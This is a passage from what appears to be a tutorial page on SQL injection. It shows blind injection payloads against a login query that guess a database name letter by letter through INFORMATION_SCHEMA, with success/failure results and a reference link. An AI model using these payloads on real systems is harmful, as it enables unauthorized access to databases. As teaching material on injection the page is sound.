<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tz%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
</code></pre>
<pre><code class="lang-sql"># Query 6
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tu%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
</code></pre>
<p>Results:</p>
<pre><code># Query 1 - Failed

# Query 2 - Succeeded

# Query 3 - Failed

# Query 4 - Failed

# Query 5 - Failed

# Query 6 - Succeeded
</code></pre><p>Based on those queries, we know that the first two letters of the database name is &#39;tu&#39;. The same concept can be applied to everything else as well.</p>
<h3 id="further-readings-and-references">Further Readings and References</h3>
<p>&quot;SQL Injection Attacks by Example&quot; - <a href="http://www.unixwiz.net/techtips/sql-injection.html" target="_blank">http://www.unixwiz.net/techtips/sql-injection.html</a></p>

                    
                    </section>
                
                
                </div>
            </div>
        </div>

        
        <a href="..\../web/sql1/sql1.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: SQL Injection 1"><i class="fa fa-angle-left"></i></a>
        
        
    </div>
</div>

        
<script src="../../gitbook/app.js"></script>

    
    <script src="https://cdn.mathjax.org/mathjax/2.4-latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    

    
    <script src="../../gitbook/plugins/gitbook-plugin-mathjax/plugin.js"></script>
    

<script>
require(["gitbook"], function(gitbook) {
    var config = {"fontSettings":{"theme":null,"family":"sans","size":2}};
    gitbook.start(config);
});
</script>

        
    </body>
    
</html>
